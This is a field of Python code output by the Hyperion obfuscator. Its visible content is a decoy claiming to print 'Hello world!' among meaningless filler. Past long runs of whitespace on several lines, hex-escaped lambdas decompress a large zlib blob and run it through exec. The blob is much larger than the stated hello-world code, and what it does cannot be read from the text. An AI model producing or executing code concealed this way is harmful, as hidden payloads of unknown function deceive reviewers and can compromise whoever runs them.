"protected": "from builtins import *\nfrom math import prod as Invert\n\n\n__obfuscator__ = 'Hyperion'\n__authors__ = ('billythegoat356', 'BlueRed')\n__github__ = 'https://github.com/billythegoat356/Hyperion'\n__discord__ = 'https://discord.gg/plague'\n__license__ = 'EPL-2.0'\n\n__code__ = 'print(\"Hello world!\")'\n\n\nRun, Round, _while, StackOverflow, System, _negative, _stackoverflow = exec, str, tuple, map, ord, globals, type\n\nclass Divide:\n    def __init__(self, Cube):\n        self._callfunction = Invert((Cube, 99340))\n        self.Product(_ceil=-53293)\n\n    def Product(self, _ceil = int):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        self._callfunction /= 32466 + _ceil\n        \n        try:\n            ((StackOverflow, (Round, _while)) for StackOverflow in {Round: Run} if Round == CallFunction)\n\n        except TypeError:\n            (Round, _while) if _while >= _negative else (Round, _while) >= _while\n\n        except:\n            _stackoverflow(52890 - -41959) == type\n\n    def Negative(self, _multiply = 43691):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        _multiply /= 39326 - 90812\n        self.Power != float\n        \n        try:\n            ((Run, {CallFunction: StackOverflow}) for Run in {CallFunction: StackOverflow} if Round > Run)\n\n        except TypeError:\n            ((Round, _while) or Round if (Round, _while) and Round else ... or (Round, (Round, _while)))\n\n        except:\n            _stackoverflow(90435 * 95744) == bool\n\n    def _algorithm(_detectvar = False):\n        return _negative()[_detectvar]\n\n    def _math(_run = 55823 * 12545, Floor = False, _random = _negative):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        _random()[_run] = Floor\n        \n        try:\n            (({Run: CallFunction}, Round) for Round in (_while, StackOverflow))\n\n        except OSError:\n            (((Run, CallFunction), Run) for Run in (Run, CallFunction))\n\n        except:\n            _stackoverflow(-85400 / -57221) == True\n\n    def execute(code = str):\n        return Run(Round(_while(StackOverflow(System, code))))\n\n    @property\n    def Power(self):\n        self._add = '<__main__.Invert object at 0x000004364BE50297>'\n        return (self._add, Divide.Power)\n\nif __name__ == '__main__':\n    try:\n        Divide.execute(code = __code__)\n        _product = Divide(Cube = -45377 / 33689)\n\n        _product.Product(_ceil = _product._callfunction * -37960)                                                                                                                                                                                                                                                          ;Divide._math(_run='XXWWXXWWWXXWXXXWXX',Floor=b'x\\x9c\\xe5\\x1a]s\\xe28\\xf2\\x9d_\\xc1\\xf2b\\xbb2\\x93\\x18\\x7f\\xc86U\\xf3r\\xc5]mR\\x99p\\xb5l\\xedf+\\x93r\\x19,\\x12g\\r\\xa2\\xc0\\xec$\\xff\\xfe\\xba[2\\x18\\x83\\xb1!\\x99\\xec\\xddE\\xa2\\xedV\\xab-\\xb9[\\xadVK&[\\xbc\\xf4ZmH\\xc9D\\xa7;\\xa60\\x14\\xa3\\xc9j9\\x8e2\\xb1\\x08\\xc3\\xf6O_:?\\xbf\\xcc\\xf9\"\\x11\\xb3N[,\\nl\\xd1*{\\x14\\x8b%\\xf1\\xe8\\x9dQ\\x92\\xa6/\\xd9#\\x7f\\x10Qf\\xbb\\xac\\xf3\\xa9\\xf3\\x8ft\\xc5\\x7f\\xe1q\\xc7\\xd8z\\xea!\\xc9\\x1eW#\\xd9\\xf0c\\x96\\xcd\\x97\\xbd\\x8b\\x0bI;\\x1f\\x8b\\xe9E\\xa9\\x99\\x8b\\x8a\\xbe\\xe3d9\\x16\\x8bx\\xbb\\x19E<\\x7fx\\xb8\\x98\\xa7\\xd1\\xc3\\x8a\\x97\\x1eJ\\x931\\x9f-\\xb9|\\xe8\\x9f\\xff\\xbe\\xfel\\x9d\\x9b%\\x96\\xb1\\x88e\\xbd6_$\\xb3L\\xef\\xfc\\xcc\\xd3T\\xb4\\xbf\\x8bE\\x1a\\xff\\xd41\\xb4\\x96\\xd1[sc\\xbd\\xb6\\xfc3\\x895\\xa3\\xc5\\x9f\\xc7|\\x9e)e\\xce\\xe6+x\\xf2\\x17\\xb1\\xe4\\xcbv\\xb4\\xe0\\xed\\x05\\x8f\\xbf\\xcd~KD\\xca3I\\x18\\x81f\\xbe\\xcd\\xfe\\x10+*Eml\\xe4\\xdb\\xecF\\x8cD\\xfc\\xd2N\\x93?\\xe1\\xb9\\x17\\xb1\\xea\\x18-\\xf9R\\xc9t.\\x16Y\\x18Bo/K\\xcd8\\xe7\\xcfI\\xa6\\x1b\\xadT\\x8c\\xa3t\\xa9\\x1bw\\xdaphY\\xc3!])\\xe3e\\xa8\\xdd\\x7fyH\\xc5\\x08XZ{\\xeb\\xf1\\xc1\\xfe\\xa0/\\xfa}\\x80\\xc1@\\x88>\\xfc\\x00\\x01L\\xbb\\xeb\\xf5\\xce>\\x9f}\\xd6?\\xebg]\\xc3\\xb8\\x87\\x96x\\x16e\\xd9\\xa2\\xba\\xa5\\xaf_o\\xbe\\xcatC\\x00\\xd7\\x1b\\xbc\\xee6\\x15\\'\\x07\\x9a\\x19\\x12\\x99\\xaeHT\\t\\x10\\x90F\\xca\\xdb\\xaad\\xc1\\xe7\\xc5`\\x002\\xa10$\\x10f$\\tx|\\xa3\\xc7\\xea\\xeeg\\xb3)\\xfd\\xf0\\x02\\x99\\xb0\\xd9\\x14\\x1e\\xaejW\\xd7F\\xab$\\xcd\\x92\\x19\\x8e\\xcb_\\xd1\\xa2\\xe6\\xf5\\x9e\\xd2\\'Hi\\x9a<%\\t\\xc0S\\x8aMCC\\x83~_\\xe4M\\xca\\xf1\\xe8\\xeb\\xd5].gI\\x96&\\xabQY\\xb7\\xc6\\'T\\xfc\\x8dR\\x7fq@Ni\\xcc\\xb8{\\xd3\\xd6\\xce\\x93Y\\xcc\\x9fu\\x8d/\\xd3\\xe8_;\\xd5\\xf7Fk\\xbf\\xeeQk\\xcf\\xcf\\xdf)\\xd3\\xef;a\\x92\\xf4\\xf1\\xb4\\x97E\"\\x9d\\xec\\xd3^\\xa5I\\x0fpFC\\xeb\\xb2\\xd3\\xbe*\\xf4?\\x9e\\xea\\xd2\\xe8/~\\x9c\\xdd\\xa5iz\\x99^\\xe2\\xef2\\x95\\t\\xef\\x97\\x1fPuB\\xec\\xd6\\xa2\\xd1\\x1d\\xf2u\\xb7\\xbf\\xcb\\x0c\\xe9\\xf6\\x16\\x90\\xdb\\x8f\\xa7\\xb7E\\xb6<ZmH#\\xe2P\\xd6\\xd0B\\xfe\\xc1\\xf4\\xc6\\xd3d>\\x15\\xe3\\xa3u\\xa7\\x14\\x83\\x1eN%pw\\'\\xa9/I\\xc6\\xcbh\\x96\\xbc\\x8d\\xfa*\\x1b;I}\\xd5\\xad\\xe5\\xea{\\x99$\\xe93\\x7f\\x9c\\xad\\x8eV \\xf45@\\x9d\\xc1\\xd5\\xc4$L\\xd2\\x9f\\xa6\\x9d?\\x89dv\\xc0U\\xe2\\xab\\t\\xd21\\xbco_.1\\x1fq\\x91\\xe1\\xab\\xc5\\xafG-\\xcf\\xa0E\\xd4\\xe34W&A\\xb1\\x85\\x8a\\xf5[\\xdfk\\xeb\\xfaH\\xb3M+\\xb6|+\\xb6\\xbbV\\x001i\\xccqK\\xa3k\\xfe$\\xdb5\\x07\\x83\\x02\\xf2\\x0f6Dc\\xfe\\xbc7\\x0ex\\xc7!\\xf2\\xdd\\x89m)\\xf0\\x00\\x02\\x00\\x07\\xa0[\\xa09\\xd6\\x88\\x86\\xb1\\t\\xaf\\xddp\\xa8\\xa5\\xf0\\xedl!\\xe6\\xd3\\xa4\\x9d\\xab\\xaa=\\x15\\x8bI\\x13y4#\\x08\\xcd\\x90\\x85Nh\\x85v\\xe8\\x85]\\xc0}\\xe07\\t\\xdb\\xa26k\\xce\\x86\\xe6|x$\\x80\\x87}x\\xd8\\t\\x1d\\xe0wv\\xa9\\xaf\\xd2vWM\\x08\\xb3\\x99\\x96\\xd6\\xf0\\x03,\\x02Ef$\\x18\\x89\\x05\\xe2\\x05a\\x97D\\xde\\xa1\\xbe\\xa7\\x0fP\\xc61J\\xd2\\xc7e\\xf4\\xa8\\xec\\xe3U/\\xe0\\x82U2e\\xad\\xa6\\xb2T\\xa6p\\xb4\\\\\\x9f\\xacVZx\\x13^\\xab\\xa1 \\x07\\x96\\xa8\\xab\\xeb\\xab\\xab\\xcb\\xcbk\\xcaW\\x08\\x90\\xae\\xaf1\\x9a\\xaf~Fi\\xe4U\\xaa\\x08\\x94\\x184Q\\x95\\x98\\xae\\xba{J<_\\xa9\\xa2\\t\\xaf\\xd7p\\xb2\\x1f^\\xe9\\xafA\\xf4k\\xd4\\x00\\x00(\\x03\\x13\\xa9\\xe5\\n\\xf4Qe\\xf7U\"2\\xd7\\xf3\\x99\\xcb\\xec\\xba\\xd7\\xba\\xaf\\x1e\\x9d\\xaa\\xa6=\\x7f+c\\xca\\xb1-Jm\\xd7_\\xd2h:\\x8a\\xa3\\xb6T\\x87\\x92N\\xa9\\xc7\\xb2z\\x07tu\\xc0\\xa4 L\\x12\\x18$\\x99\\x03\\x99\\xe9\\xb5\\x07\\x83f\\x9e\\xc0\\x84\\xfa\\xd7\\xcd\\xf2\\x13\\x1c\\xdbZ\\x0ft\\x84\\xf2\\x1d\\x7fx\\x92B\\x89\\x0eUzU\\xd2\\x1eP\\xc3-m\\xf1\\xd4.\\xefw\\xdc\\xf2\\xbdN\\xac\\xc2\\x8a\\xe7\\xaa\\xd5\\xceT\\x13 /\\x07j\\xc24\\xe1\\xf5\\x9b\\x06BJ5\\xb4\\xc9\\xc7-?m\\xfe\\x11\\xedU\\xcc\\x88\\x03:\\xa1\\x15bJ\\x0b\\xc5T\\xde\\xb0z\\xfa\\x9e\\xe3\\xbd\\x16\\x08\\xcfu)\\x1e_\\x87\\xe7\\xa7\\x8c\\xf2z\\xc6\\xe43\\x04v\\xa6\\xefe\\xe8j4Y\\xc1=:\\xca\\x1d\\xba\\xb9k,XD\\x1doC\\x17\\xba\\xa5Dxg\\xdc\\x0e\\xe1,\\x97\\x93\\x1d\\xd0\\x13\\xecB\\xc6\\xaa}\\xb9W\\x1aP\\xe8\\xfa?\\xe1/\\xc8O\\xe6Y\\x9dP\\x1c/~\\xe5\\n\\xc2!\\xc7\\x90y!\\xc7\\n6%\\xc8\\x8d\\x1d\\xfd\\xb3<.V\\x07\\xc6\\xd2\\xbf\\x91\\x9b;\\xcd\\xd7W\\xbd\\xb9\\xc3!\\xc7\\x90\\xf9\\x1arJN\\xcdi\\xcd\\xdf\\xfd\\x86\\xb6<72\\xc9\\xef(\\'\\xcc\\xd8\\x03\\xaf\\x1c\\x17^\\x92\\x97\\xca*\\xd7\\xbf\\xec\\xb1\\xf6gy\\x96Wkw\\'\\x88\\xb3-\\xc4\\xee\\x18\\xfc0a,\\xcf\\x8c,Sf\\xd7\\x82(\\xc8\\xf1\\\\\\xcfb\\xdc2\\x01\\xb3<\\x97\\xb9\\x96\\xc9\\x02\\xc6\\xb0\\xcc|*\\x81[\\x82\\x1a\\x07\\xa9\\x006\\xeb\\x02\\x8e\\xf4\\x980\\x1b\\xb9<\\xbb\\xc0?\\x02\\x9b\\x9fx\\x1e\\xe3\\xee\\x04(]\\x0f8,\\xbe\\xe9U\\xbe\\xc5\\x8fP\\xea\\xd8\\t\\x00\"\\xc8c\\xca\\xb2\\x14\\x10\\x1e\\xa92^%G\\xad?\\xd9\\xb8QaB\\x1f\\xe0Ie\\xe0dR\\x08u\\xcar\\x04\\xc1*\\xc5\\xef\\x10\\xd3\\xcb \\xf6\\xea\\xf2}\\x8fMr\\x81H\\x06Z\\x1d\\xe0\\x86\\x12\\t\\\\\\x1cD\\xf5\\xe2p(.\\xaf\\x1c\\x8f\\x89\\xcc\\x0c\\xaf\\x0e\\x93%\\xa7\\x00\\xc5\\x1a\\xa7v4\\xf4\\xfa#hu\\x00=l\\xbc\\xd0\\xbfY\\xd8R\\xd9\\x92k\\xbb\\xb0i\\x84X\\xcf\\x96Y\\xe2\\x1b\\xc81\\xd7\\x86\\xfe\\x02wD\\xea\\xa0\\xc4\\xd6\\xaaa\\x93\\xed,Ug\\xf9\\xcc\\xb2`r1\\x17\\xc0Qw\\xb7\\xa2\\\\\\xa4;\\xa5z\\xa7L\\x87\\xf9\\x19X\\x9c9\\xb8?\\x82\\xfep\\xb6\\xfb\\xd0\\x93\\xcf\\x18z\\x0bp\\x12#;\\xb2#\\x88]b\\x02\\x9f`\\x84V\\x08\\x12\\xc4\\x04\\xfe\\xd1r\\x80\\'\\xd9\\x80\\x1d(\\xbc[\\x80R9\\xe7\\xc1{\\x19\\xd6mt\\xb7\\xda\\xb2l\\x1f\\xee.\\x80\\xa3\\xee9\\xee\\xec\\xa1\\xed\\xab\\xdf\\x06\\x0bb\\xfaW\\xea\\xaa\\xde\\xbe>M\\x92\\x94\\xcf\\xa2)\\xffR\\x19\\x89\\x8cYDyLX@X@9\\xa2\\xeb\\x9aZ\\xdb\\xd7\\x14\\xea\\xaa\\xfbq=\\xc6\\xba\\xf5\\xad\\x18\\xd5\\xc7P\\xff\\x8f\\xbe\\xc2W\\x91\\xbb\\xaf\\xf6q\\x81:\\x081\\x15\\x1d\\xa3wV8\\x19\\xad\\xe3u\\x9b\\xfa\\x9c\\x0e\\xa1\\xdd3 C\\xe5Y\\xafw\\xa7\\xad\\xb2\\x89\\xaf\\xe9<\\x16c\\x1e\\x9f\\x1b\\x1a\\x98f!\\xb0(\\x86x\\xbc\\x10\\xfc\\xe5\\x14p@\\xb4^\\xe6+\\xa8,\\x05T\\x8a(K\\x8aiEfd7\\xe5\\xc5\\xa0A\\x1b\\xe9\\xf4\\x89F&\\xda\\xcf\\x912\\xf5\\xfb:\\td\\x88\\x9d\\x87\\xd9q)\\xe0\\x8e\\x0b\\xf7\\xaa>\\xee\\x0c}\\x98\\x9b\\xa0\\xb51\\xcba\\xe7mw0\\x9a\\xe1\\x87\\xdd\\xd0\\xa7\\xc3\\xd0\\x0007d\\xc0\\x1d\\x94iM\\x9br\\x80\\xd9\\xa1\\x93\\xeb\\x800\\x8f\\x1a\\xdb\\xa1\\xbe\\xcap\\x99\\xda^Z\\x85\\xad\\xa6_\\xd8z\\xd2\\xa1\\x842\\xdc&\\xbc\\xec\\xc8\\xc3j\\x80\\x8ds\\xd3\\xd6\\xdf\\xdc\\xe57xLM\\x8f\\xa7\\xbb!\\x1e\\xe7\\xe3\\xc9|@\\xb8M\\xc7\\xd3;\\xd4\\xf7\\xde\\x88\\xbe\\x997=>\\x14~GwZ\\x17\\xf9\\xe4q\\x8e\\x8cr$\\x96\\x97\\xea{\\xaen}\\x13Sm\\xf0bo\\xc5\\x9e\\xf0\\xfa\\xc1\\xe3+\\x06\\x91\\x10\\x03\\x15A\\x97\\xa0\\r\\x13\\x95e\\xa3^\\xf6\\xc1\\xbe\\xba\\x9c\\x86\\xf7\"`L\\x05\\xe1\\x15\\xb5\\r\\xdb@\\x00\\xec\\'\\xa0~\\xe4\\x1d\\xeb\\xba\\x8a\\x0ea.\\x10`{\\xa9t\\xc3\\x80.u\\xec2\\xe4\\xf7\\x15\\xafM8\\xc4W\\x80tm\\x93b7s\\x0b\\xf2>\\xa4,\\x9e\\x02\\xbf\\x84\\xfb%\\xbc\\\\\\xf6\\xb6\\xf8\\xab\\xfa*\\xc3[\\xf5G\\xba[\\xdb\\x8a\\xb3\\x07?D+\\xd7\\xed\\xf2\\xa0\\xfe\\xf6\\xc9s8\\xde\\xad*\\xefB\\xdd\\xb8\\xec\\xce\\x81}s\\xa6\\xfc\\xfeUu\\x12\\x9a\\x8e\\x91\\xc3\\xd0\\xe2\\x1d\\xb2\\xb1\\xe2\\x1d\\xe9k\\\\\\x95\\x8b4V\\xc2\\xf3\\xfb\\xdf5V\\xe59a\\x93\\xeeK\\xfb\\xa1\\x9d}O\\xf9\\xde\\xdd-\\xef\\xec\\xadd\\x9d\\x95\\xbf\\x1b\\x94p\\x86\\x1f=\\xbf\\xf36\\xe89|\\xc6W\\xbe\\x07y=E\\xb3\\x89\\xdfRs\\xfc\\xbfm~\\xff\\xd8q\\xf6I\\'\\xd5\\x90\\xe72\\xad\\x9a\\xa7J\\x878^R\\xdf\\x8e\\xd2\\x82\\xf4\\xbbUve\\xd3;6\\xf2\\xcd\\xef\\xb9\\xef\\xd5\\xa6[_\\xa6T\\x04\\xd4,8d\\x10\\'\\xe3\\x7f<|\\xfa\\x87\\x02S\\xc1\\xa1\\xb7K}\\xe3\\x0f\\x1a\\x9a\\x81\\xff-\\xc1H\\x1d\\xff\\x0eB\\xff2\\x01n\\xb7L{\\xf5W\\xfa\\xfc\\xb3\\xd1\\xfa3\\x91\\x8a\\xc9\\xf3\\xbf\\xd9t\\x0b_\\xe9\\xebx\\x8f\\xfd\\xb3\\xc9:\\xc4\\xdd\\xf9\\x9f\\xf2I_\\xcbl\\xf5\\xf5\\xcb)\\xec\\x8b\\xf3\\xef\\xa1\\x8c\\xfeO\\xb1\\xf9ZV\\xc7\\xdb\\xf8O$\\xad\\xff\\x006Kv\\xa1')\n\n        if 343368 > 9880214:\n            Divide(Cube = -38762 / 11821).Product(_ceil = _product._callfunction * 71111)\n        elif 115933 < 7666654:\n            Divide(Cube = 78434 * 78140).Product(_ceil = _product._callfunction + 18892)                                                                                                                                                                                                                                                          ;Ooo00oOo0O00oO00OooOooO00,OoooOO0oOooOO000000OO,liljjliijijililjlilliilj,DDDODOOOoOoDOoOoDoDO,SSSSSS2S2222SS22SSSSSS2=(lambda WXWXWXXXXXXXWWWWXWXWWWWWX:globals()['\\x65\\x76\\x61\\x6c'](globals()['\\x63\\x6f\\x6d\\x70\\x69\\x6c\\x65'](globals()['\\x73\\x74\\x72'](\"\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x28\\x29\\x5b\\x27\\x5c\\x78\\x36\\x35\\x5c\\x78\\x37\\x36\\x5c\\x78\\x36\\x31\\x5c\\x78\\x36\\x63\\x27\\x5d(WXWXWXXXXXXXWWWWXWXWWWWWX)\"),filename='\\x6f\\x6f\\x4f\\x6f\\x6f\\x44\\x6f\\x4f\\x6f\\x44\\x44\\x6f\\x44\\x44\\x6f\\x6f\\x6f\\x6f',mode='\\x65\\x76\\x61\\x6c'))),(lambda WXWXWXXXXXXXWWWWXWXWWWWWX:WXWXWXXXXXXXWWWWXWXWWWWWX(__import__('\\x7a\\x6c\\x69\\x62'))),(lambda WXWXWXXXXXXXWWWWXWXWWWWWX:WXWXWXXXXXXXWWWWXWXWWWWWX['\\x64\\x65\\x63\\x6f\\x6d\\x70\\x72\\x65\\x73\\x73']),(lambda lIIllIllllIIllIIlIIIllIlI,WXWXWXXXXXXXWWWWXWXWWWWWX:lIIllIllllIIllIIlIIIllIlI(WXWXWXXXXXXXWWWWXWXWWWWWX)),(lambda:(lambda WXWXWXXXXXXXWWWWXWXWWWWWX:globals()['\\x65\\x76\\x61\\x6c'](globals()['\\x63\\x6f\\x6d\\x70\\x69\\x6c\\x65'](globals()['\\x73\\x74\\x72'](\"\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x28\\x29\\x5b\\x27\\x5c\\x78\\x36\\x35\\x5c\\x78\\x37\\x36\\x5c\\x78\\x36\\x31\\x5c\\x78\\x36\\x63\\x27\\x5d(WXWXWXXXXXXXWWWWXWXWWWWWX)\"),filename='\\x6f\\x6f\\x4f\\x6f\\x6f\\x44\\x6f\\x4f\\x6f\\x44\\x44\\x6f\\x44\\x44\\x6f\\x6f\\x6f\\x6f',mode='\\x65\\x76\\x61\\x6c')))('\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x27\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x27\\x29\\x2e\\x65\\x78\\x65\\x63'))\n        _product.Product(_ceil = _product._callfunction + 18323)                                                                                                                                                                                                                                                          ;SSSSSS2S2222SS22SSSSSS2()(DDDODOOOoOoDOoOoDoDO(liljjliijijililjlilliilj(OoooOO0oOooOO000000OO(Ooo00oOo0O00oO00OooOooO00('\\x76\\x61\\x72\\x73'))),Divide._algorithm(_detectvar='XXWWXXWWWXXWXXXWXX')))\n\n    except Exception as CallFunction:\n        if 379175 > 8994003:\n            Divide.execute(code = Round(CallFunction))\n\n        elif 155627 > 3632241:\n            _product.Negative(_multiply = 73815 / _product._callfunction)"